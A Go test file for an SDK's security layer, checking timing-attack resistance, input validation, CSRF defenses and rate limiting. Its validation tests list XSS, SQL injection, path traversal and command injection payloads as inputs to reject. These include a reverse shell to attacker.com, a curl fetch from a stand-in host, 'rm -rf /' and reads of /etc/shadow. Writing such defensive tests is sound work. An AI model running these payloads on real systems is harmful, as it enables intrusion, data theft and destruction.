package security

import (
	"crypto/rand"
	"crypto/subtle"
	"encoding/base64"
	"fmt"
	"math"
	"net/http"
	"net/http/httptest"
	"os"
	"strings"
	"sync"
	"testing"
	"time"

	"github.com/mattsp1290/ag-ui/go-sdk/pkg/core/events"
	"github.com/mattsp1290/ag-ui/go-sdk/pkg/core/events/auth"
	"github.com/mattsp1290/ag-ui/go-sdk/pkg/core/events/security"
	"github.com/mattsp1290/ag-ui/go-sdk/pkg/transport/sse"
	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
	"go.uber.org/zap"
)

// TestSecuritySuite provides comprehensive security testing
type TestSecuritySuite struct {
	t          *testing.T
	authConfig *auth.AuthConfig
	secManager *sse.SecurityManager
	validator  *security.SecurityValidationRule
}

// NewTestSecuritySuite creates a new security test suite
func NewTestSecuritySuite(t *testing.T) *TestSecuritySuite {
	return &TestSecuritySuite{
		t: t,
	}
}

// TestTimingAttacks tests for timing attack vulnerabilities
func TestTimingAttacks(t *testing.T) {
	suite := NewTestSecuritySuite(t)
	
	t.Run("Authentication Timing Attacks", func(t *testing.T) {
		suite.testAuthenticationTimingAttacks()
	})
	
	t.Run("Token Validation Timing Attacks", func(t *testing.T) {
		suite.testTokenValidationTimingAttacks()
	})
	
	t.Run("Password Comparison Timing Attacks", func(t *testing.T) {
		suite.testPasswordComparisonTimingAttacks()
	})
	
	t.Run("API Key Timing Attacks", func(t *testing.T) {
		suite.testAPIKeyTimingAttacks()
	})
}

// testAuthenticationTimingAttacks tests authentication timing vulnerabilities
func (s *TestSecuritySuite) testAuthenticationTimingAttacks() {
	// Create test authenticator
	authenticator := sse.NewBearerAuthenticator("valid_token_123")
	
	// Valid token
	validToken := "valid_token_123"
	
	// Generate invalid tokens of different lengths
	invalidTokens := []string{
		"a",
		"invalid_token_short",
		"invalid_token_medium_length",
		"invalid_token_very_long_string_to_test_timing_resistance",
		strings.Repeat("x", 1000), // Very long token
	}
	
	// Measure timing for valid token
	validTimes := make([]time.Duration, 100)
	for i := 0; i < 100; i++ {
		req := httptest.NewRequest("GET", "/", nil)
		req.Header.Set("Authorization", "Bearer "+validToken)
		
		start := time.Now()
		_, err := authenticator.Authenticate(req)
		elapsed := time.Since(start)
		
		validTimes[i] = elapsed
		require.NoError(s.t, err)
	}
	
	// Measure timing for invalid tokens
	for _, invalidToken := range invalidTokens {
		invalidTimes := make([]time.Duration, 100)
		for i := 0; i < 100; i++ {
			req := httptest.NewRequest("GET", "/", nil)
			req.Header.Set("Authorization", "Bearer "+invalidToken)
			
			start := time.Now()
			_, err := authenticator.Authenticate(req)
			elapsed := time.Since(start)
			
			invalidTimes[i] = elapsed
			require.Error(s.t, err)
		}
		
		// Calculate average times
		validAvg := s.calculateAverage(validTimes)
		invalidAvg := s.calculateAverage(invalidTimes)
		
		// Timing should be similar (within reasonable variance)
		timeDiff := validAvg - invalidAvg
		if timeDiff < 0 {
			timeDiff = -timeDiff
		}
		
		// Use microsecond threshold to prevent timing attacks while being realistic for Go
		maxAllowedDiff := 50 * time.Microsecond
		
		// Adjust threshold for CI environments to account for system noise
		if os.Getenv("CI") == "true" {
			maxAllowedDiff *= 10
		}
		
		assert.True(s.t, timeDiff <= maxAllowedDiff,
			"Timing attack vulnerability detected: valid=%v, invalid=%v, diff=%v, max_allowed=%v",
			validAvg, invalidAvg, timeDiff, maxAllowedDiff)
	}
}

// testTokenValidationTimingAttacks tests token validation timing attacks
func (s *TestSecuritySuite) testTokenValidationTimingAttacks() {
	config := auth.DefaultAuthConfig()
	provider := auth.NewBasicAuthProvider(config)
	
	// Create mock auth manager since NewAuthManager doesn't exist
	authManager := &MockAuthManager{
		config:   config,
		provider: provider,
	}
	
	// Valid credentials
	validCreds := &auth.BasicCredentials{
		Username: "test_user",
		Password: "test_password",
	}
	
	// Invalid credentials with different characteristics
	invalidCredsList := []*auth.BasicCredentials{
		{Username: "a", Password: "b"},
		{Username: "test_user", Password: "wrong"},
		{Username: "wrong_user", Password: "test_password"},
		{Username: strings.Repeat("x", 100), Password: strings.Repeat("y", 100)},
	}
	
	// Measure timing for valid credentials
	validTimes := make([]time.Duration, 50)
	for i := 0; i < 50; i++ {
		start := time.Now()
		_, err := authManager.Authenticate(validCreds)
		elapsed := time.Since(start)
		
		validTimes[i] = elapsed
		require.NoError(s.t, err)
	}
	
	// Measure timing for invalid credentials
	for _, invalidCreds := range invalidCredsList {
		invalidTimes := make([]time.Duration, 50)
		for i := 0; i < 50; i++ {
			start := time.Now()
			_, err := authManager.Authenticate(invalidCreds)
			elapsed := time.Since(start)
			
			invalidTimes[i] = elapsed
			require.Error(s.t, err)
		}
		
		// Ensure similar timing characteristics
		validAvg := s.calculateAverage(validTimes)
		invalidAvg := s.calculateAverage(invalidTimes)
		
		timeDiff := validAvg - invalidAvg
		if timeDiff < 0 {
			timeDiff = -timeDiff
		}
		
		// Use microsecond threshold for token validation timing
		maxAllowedDiff := 50 * time.Microsecond
		
		// Adjust threshold for CI environments to account for system noise
		if os.Getenv("CI") == "true" {
			maxAllowedDiff *= 10
		}
		
		assert.True(s.t, timeDiff <= maxAllowedDiff,
			"Token validation timing attack vulnerability: valid=%v, invalid=%v, diff=%v",
			validAvg, invalidAvg, timeDiff)
	}
}

// testPasswordComparisonTimingAttacks tests password comparison timing attacks
func (s *TestSecuritySuite) testPasswordComparisonTimingAttacks() {
	correctPassword := "correct_password_123"
	
	// Test passwords with different characteristics
	testPasswords := []string{
		"c", // Very short, first char correct
		"co", // Short, first two chars correct
		"cor", // Progressive match
		"correct_password_12", // Almost correct
		"wrong_password_123", // Same length, different content
		strings.Repeat("x", len(correctPassword)), // Same length, all wrong
	}
	
	for _, testPassword := range testPasswords {
		times := make([]time.Duration, 100)
		
		for i := 0; i < 100; i++ {
			start := time.Now()
			
			// Use constant time comparison
			result := subtle.ConstantTimeCompare([]byte(testPassword), []byte(correctPassword))
			
			elapsed := time.Since(start)
			times[i] = elapsed
			
			if testPassword == correctPassword {
				assert.Equal(s.t, 1, result)
			} else {
				assert.Equal(s.t, 0, result)
			}
		}
		
		// All timings should be similar regardless of password similarity
		avg := s.calculateAverage(times)
		stdDev := s.calculateStandardDeviation(times, avg)
		
		// Standard deviation should be small in microseconds to prevent timing attacks
		maxStdDev := 5 * time.Microsecond
		
		// Adjust threshold for CI environments to account for system noise
		if os.Getenv("CI") == "true" {
			maxStdDev *= 10
		}
		
		assert.True(s.t, stdDev < maxStdDev,
			"Password comparison timing variance too high: avg=%v, stddev=%v, password=%s",
			avg, stdDev, testPassword)
	}
}

// testAPIKeyTimingAttacks tests API key timing attacks
func (s *TestSecuritySuite) testAPIKeyTimingAttacks() {
	validAPIKey := "sk-1234567890abcdef1234567890abcdef"
	
	authenticator := sse.NewAPIKeyAuthenticator(validAPIKey, "X-API-Key")
	
	// Test API keys with different characteristics
	testKeys := []string{
		"s", // Very short, first char correct
		"sk-", // Prefix correct
		"sk-1234567890abcdef1234567890abcde", // Almost correct
		"ak-1234567890abcdef1234567890abcdef", // Different prefix
		strings.Repeat("x", len(validAPIKey)), // Same length, all wrong
	}
	
	for _, testKey := range testKeys {
		times := make([]time.Duration, 100)
		
		for i := 0; i < 100; i++ {
			req := httptest.NewRequest("GET", "/", nil)
			req.Header.Set("X-API-Key", testKey)
			
			start := time.Now()
			_, err := authenticator.Authenticate(req)
			elapsed := time.Since(start)
			
			times[i] = elapsed
			
			if testKey == validAPIKey {
				assert.NoError(s.t, err)
			} else {
				assert.Error(s.t, err)
			}
		}
		
		// Ensure consistent timing
		avg := s.calculateAverage(times)
		stdDev := s.calculateStandardDeviation(times, avg)
		
		// API key timing variance should be controlled in microseconds
		maxStdDev := 10 * time.Microsecond
		
		// Adjust threshold for CI environments to account for system noise
		if os.Getenv("CI") == "true" {
			maxStdDev *= 10
		}
		
		assert.True(s.t, stdDev < maxStdDev,
			"API key timing variance too high: avg=%v, stddev=%v, key=%s",
			avg, stdDev, testKey)
	}
}

// TestInputValidation tests comprehensive input validation
func TestInputValidation(t *testing.T) {
	suite := NewTestSecuritySuite(t)
	
	t.Run("XSS Prevention", func(t *testing.T) {
		suite.testXSSPrevention()
	})
	
	t.Run("SQL Injection Prevention", func(t *testing.T) {
		suite.testSQLInjectionPrevention()
	})
	
	t.Run("Command Injection Prevention", func(t *testing.T) {
		suite.testCommandInjectionPrevention()
	})
	
	t.Run("Path Traversal Prevention", func(t *testing.T) {
		suite.testPathTraversalPrevention()
	})
	
	t.Run("Content Length Validation", func(t *testing.T) {
		suite.testContentLengthValidation()
	})
	
	t.Run("Header Validation", func(t *testing.T) {
		suite.testHeaderValidation()
	})
}

// testXSSPrevention tests XSS attack prevention
func (s *TestSecuritySuite) testXSSPrevention() {
	config := security.DefaultSecurityConfig()
	validator := security.NewSecurityValidationRule(config)
	
	xssPayloads := []string{
		"<script>alert('XSS')</script>",
		"<img src=x onerror=alert('XSS')>",
		"javascript:alert('XSS')",
		"<iframe src=\"javascript:alert('XSS')\"></iframe>",
		"<object data=\"javascript:alert('XSS')\"></object>",
		"<embed src=\"javascript:alert('XSS')\">",
		"<link rel=\"stylesheet\" href=\"javascript:alert('XSS')\">",
		"<div onclick=\"alert('XSS')\">Click me</div>",
		"<svg onload=\"alert('XSS')\">",
		"eval('alert(\"XSS\")')",
		"expression(alert('XSS'))",
		"vbscript:alert('XSS')",
		"<img src=\"\" onerror=\"alert('XSS')\">",
		"<body onload=\"alert('XSS')\">",
		"<input type=\"text\" onfocus=\"alert('XSS')\">",
		// Encoded variants
		"&lt;script&gt;alert('XSS')&lt;/script&gt;",
		"%3Cscript%3Ealert('XSS')%3C/script%3E",
		"<SCrIpT>alert('XSS')</SCrIpT>", // Case variation
	}
	
	for _, payload := range xssPayloads {
		timestampMs := time.Now().UnixMilli()
		event := &events.CustomEvent{
			BaseEvent: &events.BaseEvent{
				EventType:   events.EventTypeCustom,
				TimestampMs: &timestampMs,
			},
			Name:  "test_event",
			Value: payload,
		}
		
		context := &events.ValidationContext{}
		result := validator.Validate(event, context)
		
		assert.False(s.t, result.IsValid,
			"XSS payload should be detected and blocked: %s", payload)
		assert.True(s.t, len(result.Errors) > 0,
			"XSS payload should generate validation errors: %s", payload)
	}
}

// testSQLInjectionPrevention tests SQL injection prevention
func (s *TestSecuritySuite) testSQLInjectionPrevention() {
	config := security.DefaultSecurityConfig()
	validator := security.NewSecurityValidationRule(config)
	
	sqlPayloads := []string{
		"'; DROP TABLE users; --",
		"' OR '1'='1",
		"' OR 1=1 --",
		"' UNION SELECT * FROM users --",
		"admin'--",
		"admin' /*",
		"' OR 1=1#",
		"' OR 'a'='a",
		"') OR ('1'='1",
		"1' OR '1'='1' /*",
		"' OR 1=1 LIMIT 1 --",
		"' AND 1=2 UNION SELECT * FROM users --",
		"1; SELECT * FROM information_schema.tables",
		"'; WAITFOR DELAY '00:00:10' --",
		"' OR SLEEP(10) --",
		"'; EXEC xp_cmdshell('dir') --",
		"' OR BENCHMARK(10000,MD5(1)) --",
		"'; INSERT INTO users VALUES ('hacker','pass') --",
		"' OR EXISTS(SELECT * FROM users) --",
		"' HAVING 1=1 --",
		// Base64 encoded
		"JzsgRFJPUCBUQUJMRSB1c2VyczsgLS0=", // '; DROP TABLE users; --
	}
	
	for _, payload := range sqlPayloads {
		timestampMs := time.Now().UnixMilli()
		event := &events.CustomEvent{
			BaseEvent: &events.BaseEvent{
				EventType:   events.EventTypeCustom,
				TimestampMs: &timestampMs,
			},
			Name:  "test_event",
			Value: payload,
		}
		
		context := &events.ValidationContext{}
		result := validator.Validate(event, context)
		
		assert.False(s.t, result.IsValid,
			"SQL injection payload should be detected and blocked: %s", payload)
		assert.True(s.t, len(result.Errors) > 0,
			"SQL injection payload should generate validation errors: %s", payload)
	}
}

// testCommandInjectionPrevention tests command injection prevention
func (s *TestSecuritySuite) testCommandInjectionPrevention() {
	config := security.DefaultSecurityConfig()
	validator := security.NewSecurityValidationRule(config)
	
	commandPayloads := []string{
		"; rm -rf /",
		"| cat /etc/passwd",
		"&& whoami",
		"|| ls -la",
		"$(id)",
		"`whoami`",
		"; nc -l -p 1234",
		"| telnet attacker.com 4444",
		"& ping attacker.com",
		"; format c:",
		"| del /f /s /q *",
		"$(curl attacker.com)",
		"`ping -c 1 attacker.com`",
		"; /bin/bash -i >& /dev/tcp/attacker.com/4444 0>&1",
		"| python -c \"import os; os.system('whoami')\"",
		"& powershell -c \"Get-Process\"",
		"; ssh user@attacker.com",
		"|| netstat -an",
		"$(uname -a)",
		"`cat /etc/shadow`",
	}
	
	for _, payload := range commandPayloads {
		timestampMs := time.Now().UnixMilli()
		event := &events.CustomEvent{
			BaseEvent: &events.BaseEvent{
				EventType:   events.EventTypeCustom,
				TimestampMs: &timestampMs,
			},
			Name:  "test_event",
			Value: payload,
		}
		
		context := &events.ValidationContext{}
		result := validator.Validate(event, context)
		
		assert.False(s.t, result.IsValid,
			"Command injection payload should be detected and blocked: %s", payload)
		assert.True(s.t, len(result.Errors) > 0,
			"Command injection payload should generate validation errors: %s", payload)
	}
}

// testPathTraversalPrevention tests path traversal prevention
func (s *TestSecuritySuite) testPathTraversalPrevention() {
	config := security.DefaultSecurityConfig()
	config.EnablePathTraversalDetection = true
	validator := security.NewSecurityValidationRule(config)
	
	pathTraversalPayloads := []string{
		"../../../etc/passwd",
		"..\\..\\..\\windows\\system32\\config\\sam",
		"....//....//....//etc//passwd",
		"..%2F..%2F..%2Fetc%2Fpasswd",
		"..%5c..%5c..%5cwindows%5csystem32%5cconfig%5csam",
		"....\\/....\\/etc\\/passwd",
		"..%252F..%252F..%252Fetc%252Fpasswd",
		"..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
		"..%c1%9c..%c1%9c..%c1%9cetc%c1%9cpasswd",
		"..%c0%ae..%c0%ae..%c0%aeetc%c0%aepasswd",
		"../../../../../../etc/passwd%00",
		"..\\..\\..\\..\\..\\..\\windows\\system32\\config\\sam%00",
		"..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd%00",
		"..%5c..%5c..%5c..%5c..%5c..%5cwindows%5csystem32%5cconfig%5csam%00",
	}
	
	for _, payload := range pathTraversalPayloads {
		timestampMs := time.Now().UnixMilli()
		event := &events.CustomEvent{
			BaseEvent: &events.BaseEvent{
				EventType:   events.EventTypeCustom,
				TimestampMs: &timestampMs,
			},
			Name:  "file_path",
			Value: payload,
		}
		
		context := &events.ValidationContext{}
		result := validator.Validate(event, context)
		
		assert.False(s.t, result.IsValid,
			"Path traversal payload should be detected and blocked: %s", payload)
		assert.True(s.t, len(result.Errors) > 0,
			"Path traversal payload should generate validation errors: %s", payload)
	}
}

// testContentLengthValidation tests content length validation
func (s *TestSecuritySuite) testContentLengthValidation() {
	config := security.DefaultSecurityConfig()
	config.MaxContentLength = 1024 // 1KB limit
	
	validator := security.NewSecurityValidationRule(config)
	
	// Test content within limit
	smallContent := strings.Repeat("a", 500)
	timestampMs := time.Now().UnixMilli()
	smallEvent := &events.CustomEvent{
		BaseEvent: &events.BaseEvent{
			EventType:   events.EventTypeCustom,
			TimestampMs: &timestampMs,
		},
		Name:  "test_event",
		Value: smallContent,
	}
	
	context := &events.ValidationContext{}
	result := validator.Validate(smallEvent, context)
	
	assert.True(s.t, result.IsValid,
		"Content within limit should be valid")
	
	// Test content exceeding limit
	largeContent := strings.Repeat("a", 2000)
	timestampMs2 := time.Now().UnixMilli()
	largeEvent := &events.CustomEvent{
		BaseEvent: &events.BaseEvent{
			EventType:   events.EventTypeCustom,
			TimestampMs: &timestampMs2,
		},
		Name:  "test_event",
		Value: largeContent,
	}
	
	result = validator.Validate(largeEvent, context)
	
	assert.False(s.t, result.IsValid,
		"Content exceeding limit should be invalid")
	assert.True(s.t, len(result.Errors) > 0,
		"Content exceeding limit should generate errors")
}

// testHeaderValidation tests header validation
func (s *TestSecuritySuite) testHeaderValidation() {
	config := sse.ValidationConfig{
		Enabled:             true,
		MaxRequestSize:      1024 * 1024,
		MaxHeaderSize:       1024,
		AllowedContentTypes: []string{"application/json"},
	}
	
	// Create a no-op logger for testing
	logger := zap.NewNop()
	validator := sse.NewRequestValidator(config, logger)
	
	// Test header injection
	req := httptest.NewRequest("GET", "/", nil)
	req.Header.Set("X-Test", "value\r\nX-Injected: injected")
	
	err := validator.Validate(req)
	
	assert.Error(s.t, err,
		"Header injection should be detected")
	assert.Contains(s.t, err.Error(), "header injection",
		"Error should mention header injection")
	
	// Test dangerous headers
	dangerousHeaders := map[string]string{
		"X-Forwarded-Host":  "attacker.com",
		"X-Original-URL":    "/admin",
		"X-Rewrite-URL":     "/sensitive",
	}
	
	for header, value := range dangerousHeaders {
		req := httptest.NewRequest("GET", "/", nil)
		req.Header.Set(header, value)
		
		// Should not fail but should be logged
		err := validator.Validate(req)
		
		// These are suspicious but not necessarily invalid
		// They should be logged for monitoring
		assert.NoError(s.t, err,
			"Dangerous header %s should be logged but not blocked", header)
	}
}

// TestCSRFProtection tests CSRF protection mechanisms
func TestCSRFProtection(t *testing.T) {
	suite := NewTestSecuritySuite(t)
	
	t.Run("CSRF Token Validation", func(t *testing.T) {
		suite.testCSRFTokenValidation()
	})
	
	t.Run("Double Submit Cookie", func(t *testing.T) {
		suite.testDoubleSubmitCookie()
	})
	
	t.Run("SameSite Cookie Protection", func(t *testing.T) {
		suite.testSameSiteCookieProtection()
	})
	
	t.Run("Origin Header Validation", func(t *testing.T) {
		suite.testOriginHeaderValidation()
	})
}

// testCSRFTokenValidation tests CSRF token validation
func (s *TestSecuritySuite) testCSRFTokenValidation() {
	// Generate a valid CSRF token
	tokenBytes := make([]byte, 32)
	rand.Read(tokenBytes)
	validToken := base64.StdEncoding.EncodeToString(tokenBytes)
	
	// Mock CSRF validator
	validator := &CSRFValidator{
		validTokens: map[string]time.Time{
			validToken: time.Now().Add(time.Hour),
		},
	}
	
	// Test valid token
	req := httptest.NewRequest("POST", "/api/data", nil)
	req.Header.Set("X-CSRF-Token", validToken)
	
	err := validator.ValidateCSRF(req)
	assert.NoError(s.t, err, "Valid CSRF token should pass validation")
	
	// Test missing token
	req = httptest.NewRequest("POST", "/api/data", nil)
	err = validator.ValidateCSRF(req)
	assert.Error(s.t, err, "Missing CSRF token should fail validation")
	
	// Test invalid token
	req = httptest.NewRequest("POST", "/api/data", nil)
	req.Header.Set("X-CSRF-Token", "invalid_token")
	err = validator.ValidateCSRF(req)
	assert.Error(s.t, err, "Invalid CSRF token should fail validation")
	
	// Test expired token
	expiredToken := "expired_token"
	validator.validTokens[expiredToken] = time.Now().Add(-time.Hour)
	
	req = httptest.NewRequest("POST", "/api/data", nil)
	req.Header.Set("X-CSRF-Token", expiredToken)
	err = validator.ValidateCSRF(req)
	assert.Error(s.t, err, "Expired CSRF token should fail validation")
}

// testDoubleSubmitCookie tests double submit cookie CSRF protection
func (s *TestSecuritySuite) testDoubleSubmitCookie() {
	// Generate a valid token
	tokenBytes := make([]byte, 32)
	rand.Read(tokenBytes)
	token := base64.StdEncoding.EncodeToString(tokenBytes)
	
	validator := &CSRFValidator{}
	
	// Test matching cookie and header
	req := httptest.NewRequest("POST", "/api/data", nil)
	req.Header.Set("X-CSRF-Token", token)
	req.AddCookie(&http.Cookie{
		Name:  "csrf_token",
		Value: token,
	})
	
	err := validator.ValidateDoubleSubmitCookie(req)
	assert.NoError(s.t, err, "Matching cookie and header should pass validation")
	
	// Test missing cookie
	req = httptest.NewRequest("POST", "/api/data", nil)
	req.Header.Set("X-CSRF-Token", token)
	
	err = validator.ValidateDoubleSubmitCookie(req)
	assert.Error(s.t, err, "Missing cookie should fail validation")
	
	// Test mismatched cookie and header
	req = httptest.NewRequest("POST", "/api/data", nil)
	req.Header.Set("X-CSRF-Token", token)
	req.AddCookie(&http.Cookie{
		Name:  "csrf_token",
		Value: "different_token",
	})
	
	err = validator.ValidateDoubleSubmitCookie(req)
	assert.Error(s.t, err, "Mismatched cookie and header should fail validation")
}

// testSameSiteCookieProtection tests SameSite cookie protection
func (s *TestSecuritySuite) testSameSiteCookieProtection() {
	// Test SameSite=Strict
	w := httptest.NewRecorder()
	cookie := &http.Cookie{
		Name:     "session",
		Value:    "token123",
		SameSite: http.SameSiteStrictMode,
		Secure:   true,
		HttpOnly: true,
	}
	
	http.SetCookie(w, cookie)
	
	setCookieHeader := w.Header().Get("Set-Cookie")
	assert.Contains(s.t, setCookieHeader, "SameSite=Strict",
		"Cookie should have SameSite=Strict")
	assert.Contains(s.t, setCookieHeader, "Secure",
		"Cookie should have Secure flag")
	assert.Contains(s.t, setCookieHeader, "HttpOnly",
		"Cookie should have HttpOnly flag")
	
	// Test SameSite=Lax
	w = httptest.NewRecorder()
	cookie.SameSite = http.SameSiteLaxMode
	
	http.SetCookie(w, cookie)
	
	setCookieHeader = w.Header().Get("Set-Cookie")
	assert.Contains(s.t, setCookieHeader, "SameSite=Lax",
		"Cookie should have SameSite=Lax")
}

// testOriginHeaderValidation tests origin header validation
func (s *TestSecuritySuite) testOriginHeaderValidation() {
	allowedOrigins := []string{
		"https://example.com",
		"https://app.example.com",
		"https://subdomain.example.com",
	}
	
	validator := &CSRFValidator{
		allowedOrigins: allowedOrigins,
	}
	
	// Test valid origins
	for _, origin := range allowedOrigins {
		req := httptest.NewRequest("POST", "/api/data", nil)
		req.Header.Set("Origin", origin)
		
		err := validator.ValidateOrigin(req)
		assert.NoError(s.t, err,
			"Valid origin should pass validation: %s", origin)
	}
	
	// Test invalid origins
	invalidOrigins := []string{
		"https://attacker.com",
		"http://example.com", // HTTP instead of HTTPS
		"https://evil.example.com.attacker.com",
		"https://example.com.attacker.com",
		"javascript:alert('XSS')",
		"data:text/html,<script>alert('XSS')</script>",
	}
	
	for _, origin := range invalidOrigins {
		req := httptest.NewRequest("POST", "/api/data", nil)
		req.Header.Set("Origin", origin)
		
		err := validator.ValidateOrigin(req)
		assert.Error(s.t, err,
			"Invalid origin should fail validation: %s", origin)
	}
}

// TestRateLimiting tests rate limiting functionality
func TestRateLimiting(t *testing.T) {
	suite := NewTestSecuritySuite(t)
	
	t.Run("Basic Rate Limiting", func(t *testing.T) {
		suite.testBasicRateLimiting()
	})
	
	t.Run("Per-Client Rate Limiting", func(t *testing.T) {
		suite.testPerClientRateLimiting()
	})
	
	t.Run("Rate Limiting Burst", func(t *testing.T) {
		suite.testRateLimitingBurst()
	})
	
	t.Run("Distributed Rate Limiting", func(t *testing.T) {
		suite.testDistributedRateLimiting()
	})
}

// testBasicRateLimiting tests basic rate limiting
func (s *TestSecuritySuite) testBasicRateLimiting() {
	config := sse.RateLimitConfig{
		Enabled:           true,
		RequestsPerSecond: 5,
		BurstSize:         10,
	}
	
	rateLimiter := sse.NewRateLimiter(config, nil)
	defer rateLimiter.Stop()
	
	// Test burst allowance
	for i := 0; i < 10; i++ {
		allowed := rateLimiter.Allow("test_client", "/api/test")
		assert.True(s.t, allowed,
			"Request %d should be allowed within burst", i+1)
	}
	
	// Test rate limit exceeded
	allowed := rateLimiter.Allow("test_client", "/api/test")
	assert.False(s.t, allowed,
		"Request should be blocked after burst limit")
	
	// Wait for rate limit to reset
	time.Sleep(200 * time.Millisecond)
	
	// Should be allowed again
	allowed = rateLimiter.Allow("test_client", "/api/test")
	assert.True(s.t, allowed,
		"Request should be allowed after rate limit reset")
}

// testPerClientRateLimiting tests per-client rate limiting
func (s *TestSecuritySuite) testPerClientRateLimiting() {
	config := sse.RateLimitConfig{
		Enabled:           true,
		RequestsPerSecond: 10,
		BurstSize:         20,
		PerClient: sse.RateLimitPerClientConfig{
			Enabled:              true,
			RequestsPerSecond:    2,
			BurstSize:            5,
			IdentificationMethod: "ip",
		},
	}
	
	rateLimiter := sse.NewRateLimiter(config, nil)
	defer rateLimiter.Stop()
	
	// Test client 1
	client1 := "192.168.1.1"
	for i := 0; i < 5; i++ {
		allowed := rateLimiter.Allow(client1, "/api/test")
		assert.True(s.t, allowed,
			"Client1 request %d should be allowed", i+1)
	}
	
	// Client 1 should be blocked
	allowed := rateLimiter.Allow(client1, "/api/test")
	assert.False(s.t, allowed,
		"Client1 should be blocked after per-client limit")
	
	// Test client 2 (should still be allowed)
	client2 := "192.168.1.2"
	for i := 0; i < 5; i++ {
		allowed := rateLimiter.Allow(client2, "/api/test")
		assert.True(s.t, allowed,
			"Client2 request %d should be allowed", i+1)
	}
	
	// Client 2 should now be blocked
	allowed = rateLimiter.Allow(client2, "/api/test")
	assert.False(s.t, allowed,
		"Client2 should be blocked after per-client limit")
}

// testRateLimitingBurst tests rate limiting burst functionality
func (s *TestSecuritySuite) testRateLimitingBurst() {
	config := sse.RateLimitConfig{
		Enabled:           true,
		RequestsPerSecond: 1,
		BurstSize:         5,
	}
	
	rateLimiter := sse.NewRateLimiter(config, nil)
	defer rateLimiter.Stop()
	
	// Should allow burst requests
	for i := 0; i < 5; i++ {
		allowed := rateLimiter.Allow("test_client", "/api/test")
		assert.True(s.t, allowed,
			"Burst request %d should be allowed", i+1)
	}
	
	// Should block after burst
	allowed := rateLimiter.Allow("test_client", "/api/test")
	assert.False(s.t, allowed,
		"Request should be blocked after burst")
	
	// Wait for one token to be replenished
	time.Sleep(1100 * time.Millisecond)
	
	// Should allow one more request
	allowed = rateLimiter.Allow("test_client", "/api/test")
	assert.True(s.t, allowed,
		"Request should be allowed after token replenishment")
}

// testDistributedRateLimiting tests distributed rate limiting
func (s *TestSecuritySuite) testDistributedRateLimiting() {
	// This would test rate limiting across multiple instances
	// For now, we'll test the coordination mechanism
	
	config := sse.RateLimitConfig{
		Enabled:           true,
		RequestsPerSecond: 10,
		BurstSize:         20,
	}
	
	// Create multiple rate limiters (simulating distributed instances)
	rateLimiter1 := sse.NewRateLimiter(config, nil)
	rateLimiter2 := sse.NewRateLimiter(config, nil)
	
	defer rateLimiter1.Stop()
	defer rateLimiter2.Stop()
	
	// Each limiter should enforce its own limits
	// In a real distributed system, they would share state
	
	client := "test_client"
	
	// Test that each limiter enforces limits independently
	for i := 0; i < 20; i++ {
		allowed1 := rateLimiter1.Allow(client, "/api/test")
		allowed2 := rateLimiter2.Allow(client, "/api/test")
		
		// Both should allow initially
		if i < 20 {
			assert.True(s.t, allowed1,
				"RateLimiter1 should allow request %d", i+1)
			assert.True(s.t, allowed2,
				"RateLimiter2 should allow request %d", i+1)
		}
	}
	
	// Both should block after limit
	allowed1 := rateLimiter1.Allow(client, "/api/test")
	allowed2 := rateLimiter2.Allow(client, "/api/test")
	
	assert.False(s.t, allowed1,
		"RateLimiter1 should block after limit")
	assert.False(s.t, allowed2,
		"RateLimiter2 should block after limit")
}

// Utility functions

// calculateAverage calculates the average of a slice of durations
func (s *TestSecuritySuite) calculateAverage(durations []time.Duration) time.Duration {
	if len(durations) == 0 {
		return 0
	}
	
	var total time.Duration
	for _, d := range durations {
		total += d
	}
	
	return total / time.Duration(len(durations))
}

// calculateStandardDeviation calculates the standard deviation
func (s *TestSecuritySuite) calculateStandardDeviation(durations []time.Duration, avg time.Duration) time.Duration {
	if len(durations) == 0 {
		return 0
	}
	
	var sum float64
	for _, d := range durations {
		diff := float64(d - avg)
		sum += diff * diff
	}
	
	variance := sum / float64(len(durations))
	// Return the square root of variance for proper standard deviation
	stdDev := math.Sqrt(variance)
	return time.Duration(stdDev)
}

// Mock CSRF validator for testing
type CSRFValidator struct {
	validTokens    map[string]time.Time
	allowedOrigins []string
	mutex          sync.RWMutex
}

// ValidateCSRF validates CSRF token
func (v *CSRFValidator) ValidateCSRF(r *http.Request) error {
	token := r.Header.Get("X-CSRF-Token")
	if token == "" {
		return fmt.Errorf("missing CSRF token")
	}
	
	v.mutex.RLock()
	expiry, exists := v.validTokens[token]
	v.mutex.RUnlock()
	
	if !exists {
		return fmt.Errorf("invalid CSRF token")
	}
	
	if time.Now().After(expiry) {
		return fmt.Errorf("expired CSRF token")
	}
	
	return nil
}

// ValidateDoubleSubmitCookie validates double submit cookie
func (v *CSRFValidator) ValidateDoubleSubmitCookie(r *http.Request) error {
	token := r.Header.Get("X-CSRF-Token")
	if token == "" {
		return fmt.Errorf("missing CSRF token in header")
	}
	
	cookie, err := r.Cookie("csrf_token")
	if err != nil {
		return fmt.Errorf("missing CSRF token in cookie")
	}
	
	if subtle.ConstantTimeCompare([]byte(token), []byte(cookie.Value)) != 1 {
		return fmt.Errorf("CSRF token mismatch")
	}
	
	return nil
}

// ValidateOrigin validates origin header
func (v *CSRFValidator) ValidateOrigin(r *http.Request) error {
	origin := r.Header.Get("Origin")
	if origin == "" {
		return fmt.Errorf("missing Origin header")
	}
	
	for _, allowed := range v.allowedOrigins {
		if origin == allowed {
			return nil
		}
	}
	
	return fmt.Errorf("invalid origin: %s", origin)
}

// MockAuthManager is a mock implementation for testing
type MockAuthManager struct {
	config   *auth.AuthConfig
	provider *auth.BasicAuthProvider
}

func (m *MockAuthManager) ValidateCredentials(creds auth.Credentials) error {
	// Mock validation - just simulate processing time
	time.Sleep(time.Microsecond)
	
	// Simple validation logic for testing
	if basicCreds, ok := creds.(*auth.BasicCredentials); ok {
		if basicCreds.Username == "test_user" && basicCreds.Password == "test_password" {
			return nil
		}
	}
	
	return fmt.Errorf("invalid credentials")
}

func (m *MockAuthManager) Authenticate(creds auth.Credentials) (*auth.AuthContext, error) {
	// Mock authentication - simulate processing time
	time.Sleep(time.Microsecond)
	
	err := m.ValidateCredentials(creds)
	if err != nil {
		return nil, err
	}
	
	// Return a mock auth context
	expiresAt := time.Now().Add(time.Hour)
	return &auth.AuthContext{
		UserID:      "test_user",
		IssuedAt:    time.Now(),
		ExpiresAt:   &expiresAt,
		Permissions: []string{"read", "write"},
	}, nil
}